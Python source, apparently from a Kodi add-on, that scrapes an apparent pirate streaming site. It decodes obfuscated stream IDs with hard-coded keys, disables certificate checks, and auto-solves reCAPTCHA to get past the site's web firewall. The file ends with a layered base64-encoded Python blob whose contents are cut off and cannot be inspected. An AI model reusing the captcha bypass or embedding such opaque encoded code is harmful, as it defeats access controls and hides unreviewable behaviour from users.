    reg = '?sub.info='
    reg = reg if reg in link2 else '?subtitle_json='

    link,subt = link2.split(reg)
    
    
    subsout=[]
    subtx = unquote(subt)
    subt = False
    if subtx:
        response = sess.get(subtx, headers=headers, verify=False).json()

        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'mcloud' in link2 or 'vizcloud' in link2:

        pattern = r'(?://|\.)((?:my?|viz)cloud\.(?:to|digital|cloud))/(?:embed|e)/([0-9a-zA-Z]+)'
        hostm_id = re.findall(pattern,link,re.DOTALL)
        #

        if hostm_id:
            media_id = hostm_id[0][1]
            host = hostm_id[0][0]
            med_id = vidcloud_deco(media_id).replace('=','').replace('/','_')

            link = re.sub('/(?:embed|e)/','/info/',link2).replace(media_id,med_id.replace('=','').replace('/','_'))
        stream_url = ''
        try:
            response = sess.get(link, headers=headers, verify=False).json()
            outz=[]
    
            if 'success' in response:
                if response.get('success',None):
                    srcs = response.get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
            elif 'status' in response:
                if response.get('status',None) == 200:
                    srcs = response.get('data',None).get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
        except:
            pass
    
    
    

    else:
        
        stream_url = resolveurl.resolve(link)
    if stream_url:
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

def DecodeLink(mainurl):

    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21

    
    
    
    ab = 'DZmuZuXqa9O0z3b7'
    ac= decode2(mainurl)

    link = dekoduj(ab,ac)
    link = unquote(link)
    return link

#def getFileJson():
#   with xbmcvfs.File(jfilename) as f:
#       jsondata = json.loads(f.read())
#   html =   jsondata.get('html',None)
#   return html


    
    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('html',None)
    return html


def getLinksSerial(hrefx):
    try:
        sez,ep = hrefx.split('-')
    except:
        sez,ep,sh = hrefx.split('-')
    a=''
    
    htmlx =  getFileJson()
    href = re.findall('href="([^"]+)',htmlx)[0]
    href = 'https://fmovies.to'+href if href.startswith('/') else href
    
    
    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"title"}) # = <h1 itemprop="name" class="title">
    mname = mname[0] if mname else ''
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    
    
    
    
    
       
#   for serv,linkid,href in servid :
#   
#       href = 'https://fmovies.to'+href if href.startswith('/') else href
#   
#       nazwax = '- '+nazwa if mname else nazwa
#       host = re.findall('data-id="%s".*?>(.+?)<'%str(serv),servers,re.DOTALL)[0]
#       tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
#       add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    #if len(servid)>0:
    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinksSerial', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seas,serv = href.split('|')

    html =   getFileJson() 

   # episodes = re.findall('data-season="%s"(.*?)<\/ul>'%str(seas),html,re.DOTALL)[0]

    
    episodes = parseDOM(html,'div', attrs={'class': "episodes",'data\-season': str(seas)})[0] 
    
    
    
    out=[]

    #<div class="episode">
    epizody = parseDOM(episodes, 'div', attrs={'class': "episode"})#[0] 
    for epi in epizody:
    
   # for kname,title in re.findall('data-kname="([^"]+).*?>(.+?)<\/',episodes,re.DOTALL):
        kname = re.findall('data\-kname="([^"]+)',epi,re.DOTALL)[0]

        try:
            sez,epis = kname.split('-')
        except:
            sez,epis,sh = kname.split('-')
        seas = 'S%02d'%int(sez)
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)
        title = re.findall('class="name">([^<]+)',epi,re.DOTALL)#[0]
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        out.append({'title':PLchar(title) ,'href':kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})

    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"
 
    verid = getVerid(id)    
    params = (
        ('id', id),
        ('vrf', verid),

    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html = (response.content)

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')
 
    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#
    
        
    jsondata = response.json()

    with io.open(jfilename, 'w', encoding='utf8') as f:
        str_ = json.dumps(jsondata,
            indent=4, sort_keys=True,
            separators=(',', ': '), ensure_ascii=False)
        f.write(to_unicode(str_))

    html = jsondata.get('html',None)
    

  #  sezony = parseDOM(html, 'ul', attrs={'class': "seasons"})[0]
  #  sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)
    sezony = parseDOM(html, 'div', attrs={'id': "seasons"})[0]
    
    

    sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)

    for sez in sezonyx:

       # sesid,servers,title = re.findall('data-id="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
     #   sesid,servers,title = re.findall('data-number="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
        

        sesid = re.findall('value="([^"]+)',sez,re.DOTALL)[0]
        title= re.findall('>([^<]+)<span',sez,re.DOTALL)[0]
        servers = ''
        out.append({'title':title.strip()+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22
    CUSTOM_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    CUSTOM_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
   # seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    seed = 'dOuhV3IsSvf7jeI5' #28/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
#function av(n, t) {
#    var r = _0x450c;
#    for (var i, u = [], e = 0, o = r7, c = 0; c < 256; c++) u[c] = c;
#    for (c = 0; c < 256; c++) e = (e + u[c] + n[K4 + e4 + s4](c % n[ii])) % (256), i = u[c], u[c] = u[e], u[e] = i;
#    for (var c = 0, e = 0, f = 0; p.rdOti(f, t[ii]); f++) e = (e + u[c = p[r(1086) + "Dg"](c, 1) % (256)]) % (256), i = u[c], u[c] = u[e], u[e] = i, o += A3[e5 + qt + e4](t[K4 + e4 + s4](f) ^ u[p.AXpPG(u[c] + u[e], 256)]);
#    return o;
#}
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
    #e+=1
        o = (o + e) % c
        u = (u + i[o]) % c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x


def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                #a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
                
                try:
                    a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr((n[e])^ i[(i[o] + i[u]) % c] )
                except:
                    a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
                
                
                
                
                
                
                
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">") 
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')   
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")   
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")   
    return char 

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NDYzMjUwMzQ3MzcxNTczNTY2NzU1MjdhNmUyYjM0MzA2YTc5NjM2MjZlNTY3MjM1NDEyYjZmNzI3MDUzNmQ1MjdhNGE2YzU5MzQ2NDc4NTE1MDZmNDQ1MzQ2NzYzMzY4NTg1MzUyNGE0MTYxNDQ2ZTU0NjQ0YTYyNTAyZjM2NTc1Nzc1NjI0ZjcyNjQ3NjU0MzgzOTZmNDg3NTU5Njg0NDc3NTczMjc3Nzg0ODM3NjMyYjMzNTk0YjM4MzUyZjJiMzg3NjJiNTU2YzM1MmYzNzZlMmYyYjM1NjI1ODJmMmY2MjY2MmYzOTcwNjQzNTM1NzYyZjJiMzIyYjJiMmY0ODY1NzY2ZDJiNzY0ODM1NmMzOTY2NjQzMzJmNjI2NjRhNzYyZjM2NDYzOTM1NTIyZjc1MzMzMzMzMmI3MjcyNTIyZjRmMmI3NjJmMzM3NDRjMmYyZjJiNmM3YTM5NTU1MDdhNzUyZjMxNzM3NTc2Nzc3NDJiNjM2YzQyMzk0ZjMzNjY2ODYxNGI2MTM5NTk0YTMzNjQ2YTM0NjM1YTRlMzgyZjZmNzkyYjc5NmY3NjM4NTM0Nzc2MzUzMDRmNTIzNTU1NjIzMDU5MmY2Mjc0MzE1NDM4NjYzODU2NmQzOTU3NzM2YjM1NzQyZjU4NjYzODQ2N2E3YTY5NzU3NTM1NjQ1NzM3Nzc3YTRmNjU3MjQ4NjQzNTMzMmY3MzU5NzM2NTJiNjQ0YTJmNTM2OTc0NWE1YTYxMzg0YzM0NjU1NDc2NTg1MjdhNTUzODc0NmU2OTYzMzkzODMwNDczNDJiNTg1NzVhMzY1NzQxMzc3Mjc5NTg0YzUxNjg3MTM0MzA3NjZlNzY0NDc5NmYzMjc0NzA2NTU1NWE2NTRmMzY3MzQyMzgzOTYzNWE2NTU2NmI1NzY1NjY0Nzc5NzM1NjU5Mzc3NDcwNjE1YTYyNmQzNTcyNDI1NDQ3NmE1MTMwMzk0ZjQ5NjI0NzY2NjY2OTMzNTY2MjY4NGE2ODY2NDg3NzU3NWE3OTU3NTc3YTc4NjY2MTU3NGU1YTRiMzMzNDJmMzQ3NjY1MmI3MTRkNzI3MDMwNzQ2NTZkN2E3MzcwNjg1NzVhMzM3MzZjNjI3Njc1NmM3MjU1MzI2Yzc4NmU3NTc4MzU2NzM1MzUyYjZlNzI1OTVhNTc0NjUyMzc3YTU4Nzk3MTc1Nzk3NzdhN2E3ODdhNzU0YjM4NzI0NDQ0NjY0NDUwNGU3YTZjNTkzMzMzMzQyZjZlNDQ2ZjQxNjU0ZjM2MzI0NTM5Mzg2MjQzNzMzMTMzN2EyZjRmMmI2NTU1NWEzMTc5NTg0ZDcyNDU3NTQxMmY1MDQ2NDg0YzZlNjU0NTM5Mzc1MDYzNjY0NjM3NDY2NDVhMzQ2YTM4NTgzMzRjNDk2NTM4N2EzNzZlNzU0MzZkNzU3NTMxNmM3OTZlNzA1NDRmMzg3MzM4NmYzNTU4Mzc3ODY2NmQ3OTczNTgzMTc5MzA1MDM4Mzg1NDdhNzU0NjM1Nzc1MDc2NTU2MTM3Mzk2MzU0N2E0ZDM4NmY0ZDZmMzY3NjcyNTg3OTUxMzg1MzQxNmU3OTQxNDg3Njc3Mzc2NzU3NjY3MzYzMzQ2ZDQ3MmY2ZDMyNDg3MDQ5NGI3Mzc3NDYzNjc5NzQ3NDdhNmIyZjRjNzU3MDUzNjQ1YTdhMmY2NjM5NTk0NDMxNWE0MTU3NzU0Yjc4NzQ3OTczN2E0NzRmNzI1NDQ2NTA3YTRhNzYzMzUxMzA2NTYzNDgyYjYxNDczOTJiNjY0NDQ3NmE0YjRhNDQ2Njc4NGY0ODY2NDQ2NDQ3NGQyYjQyNTQ1MDQyNjU1ODMwNGY3NTcwNjM0ODMxMzY1MTcwMzY3MTMwNzAzODUxNmIzNzU2NDc3NTc0NTk1MTMwMzY1MTRiMzM1MzMxMzk0NDMyNGQ0NDM5NmM0NDQ4NmU3MjM0NDM2Njc1NDk2MjYzNjkzMzMxNzg3OTM3Nzc3Mjc5NDc2NzM4NmQzMTM4NDQ3NjZiNjk2MjZlNmEzMjUxNzczMjRkNmI0NDU3NjY0YzM2NmQ3Njc2NDYyYjM2NDc0NzU2MzY2MzZiNzk0ZjMwNDQ1NzJiNWE1Mjc5NDc1MDM4Nzc1ODZjNTU2MTQ5NjgyZjU5NDg2NDM1NmUzNDZlNmY1MDRmMzg1MDc2NmI0YjM4NTA1MDU1NDg3NTU5NmYyZjU1NGQ2NjM0Njc0ODJiNzE0NjY1NzM1MDc2NDIzODY5NGU2MTdhMzc0MjRjNzY2YjY1NzI3MDZlNmE2ZTYzNzg1Mjc2Njk1NTJiNjkzMzcxNWE2OTUyMzc3NTZjNDUzODRmMmI1MzMwNzI1NzU0NjY0NzU2Mzc0NDZhMzk1MjMxNzk2ODcwMzY3ODQ4NmU3YTZkNTc2NDZjNmE3NjcyNWEzMjc5N2E3NjZkNjc3NjZjNzUzMzZhNTg3MzU1MzI2NTMwNDI3NzM5Nzk3NzJmN2EzNDZlNjc3Mjc5Nzk0ZjY3NzI1YTYyNjYzMDMxMzc0MzU4NDQ2MjM0NjY2ZjQzMzkyYjYxNzU2NzM3NGY1MzMwNzI3YTc4NTEzNzM4NjQ2NTUxNTc3YTM2NDI2ZTYzNDY1MDU5NzE3OTY4Nzg0Yzc3MzU1MDM5NjczNTM1NTk3NjZlNGQ0YjU5NzQ2NDZjNmU3ODRmNTkzMTMxNTU0ZTJiNTE3NzMwNDQzOTRiNTc0ZDM1NjM0ZTM2NjM1MDJiNzc1MDM4Mzk1YTU5NDUyYjc5NDg2MzczNjE2ZTY3MmIyYjY5NjUzNDM3NTQ1OTU2MzYzMDcwNzgzNzc5NjgyZjJmNDczOTc0NGI0ODYyNmE2OTc2Nzk3MjRmNGI0YzRkNTkzODRiNDU2NDVhNjg3OTQ2MzI1NzMzNmI0NzM0Nzc1YTZiNGUzOTQxNTg1OTRjNjYzNDdhNzY2NDZhNTg2NDQzNTI3OTQ0MzM2YTRmNmU1MDU5NDg2NTUxNDY2ZTU1NGI3NjZiNDM2ZTY1NGY3OTUyNDg2OTUyNTc1NTY5MmY2NzM2MzU0MzRiMzY1MzQ1MzY2YTQ4NTU0NDJiMzg0NDMzNTk0OTY1Nzk0ZTY0NmM2ZDM4MzAzMDYxNTg0OTZjMmI0NjM5Nzg2NjMwNDEzMjc0NjMyZjM5NzI0OTQyN2EzNzZlNzc0MzM4NTM3MjY4NjYzNjY3NTM3OTc5NDEyYjRmNTI0ZDY2NzA3MjZhNzY1NjY4MzM1OTUwNzUzODQ5NjQ3ODUyNmE3MzUzNTAzNjM0NzcyZjc3Nzk3OTQ4NmQ1NDY0NzM0Nzc2Nzg2MjM5Nzg3YTczNDU1Mzc1Mzc2ODcwNzg1OTUxMzMyZjZmNDYyZjcwNTg2ZTc5NDY2MTM2NTQ2NjU2NmY2ODUwNGM2ZDMyNTk2MzY4NGM2NjczNjY2YzY1NmE1NjY4NDcyZjM5NTk3NTM3NDEzNjcyNjg1NzM2NmU0NTY4NjM0ODc4NGI2Yjc4NDQ3NTQyMzcyZjQ1NzU0Zjc0NzM1MTdhMzg1MzY0NjM3YTMyNjk0ODczNGE3NTQyNjM1NTY1NGM0YzQ3NDg1ODU3NDk2NjM0NGI3NjU2NDk0ZjM0NDg2NjZlNTM1MzRmNzc1NTM1NDcyYjM4NGUzNDMwNGEyYjRlNzU0MTZhNjIzMDQ4NjY0ZDY0MmY1MzZlNGM0MjY2NjI1OTVhN2E1NzQ2NWEzNDY2NDQ3MDQxNTgzNTRmNjU1NzU3NDI2NjQ3NDg3NjQyMmI2YjY2MmY0YTRiNjk1MjRmNzc3OTM4NDc3ODcyNGQ0NDM0N2E0YjJiNGYzNDY3NDg2YTQ4NzY1MTU3Nzc1NTM1NzU2ZTc4NjUzNDY4NTg3MzcyNmY1MjY2NjUzNDZhNTQzOTRjMzg1NDM0NzczNzY5NDY0ZjRlNmU2MTU5MzczMjZhNmU2YTZiNzgzNjRkNjY2MjdhMzMzODZhNzA2NzQzNzYzMTY4NTI3YTZmNjg0MTZhNDU3NDM0NDgyYjYxNTA2NDY2NzE0ZDJiMzQ2ODdhNTA3NjMxNGEzNDY5NDQ1NzY3MmI2NjY3NzAzMDczNTg2MzcxNWE2NjRkNDEzNTc5N2E2ZDRjNTA0ODc1MzM1NjQ1NzY3NjQ0MzI2OTU2NzU3NTMyNzY0OTZjMmY2ZDQ3NjM1MzYxNmU2ZTc5NDM0Zjc3Njc1OTcxMzY0NTQ4NmI0Yzc2NmU0MjZmNzYyZjQzNTg2OTc5NTI0YzY2NGQ1MDMzNmY2NjM0NGY0NjQzNTgyYjRiNTAzOTMwNGMyZjZmNGMzNzQ5NDc2YTQ0NTA2NTM1MzYzNzM3NzA1ODc0NDM1MDY4NDczOTUxNTYyYjc3NjgzNDdhMzI0NDY2MzA1MDY5NmE0NTRkMzczODUwMzg0YjM2MzQ0NDc2MzQ3NTYzNGQ1MzM1NzQ3YTUwNGI3MzU1NjMyYjc3NTMyYjY5NWEzODUyNjg3OTc3NDg2NjQ1NGQ2NDcyNWE3NzUwNjY0MTM3NmE0NjJmNzg0OTc1NGY2NjcyMzk2YjMzNmU0ODcwMzc3ODY5NTAzODJiNjM2ZTM4Njk2YzZhNDE0YjM3NDQzMzcwNmM2NjM0NjQzODQ0MzgzNjZlNDkyZjUwMzc0OTZlMzQ3OTU4N2E0NjQ3NTQ0ZDU3Mzc0ODc0NzU2NzZhNmIzNzdhNDE1MDQ5NjEzNDM2NzM0NDRmNTk0NjYzMzE3ODc5MmI3NDU1NWEzODc4MzQzNjZiNmMzODUyMzkzNjY4NTI3NzQ3MzU3NDczNTYzNzU1MzE3OTQzMzYzNDdhNGE3Nzc3NzgzODcxNTg0NTZlMzQzNzc4NjU3OTU4Nzg2ZDMzMzc0MzU3NDg0YjQxNjY2NTQ5MzUzMjY5NmU3NDQ2NzY0NzQ4NjM2ZjRiMzg1NDY0NmY2YTMzNzM0ZTUwMmI2OTYyMzA0NTYzN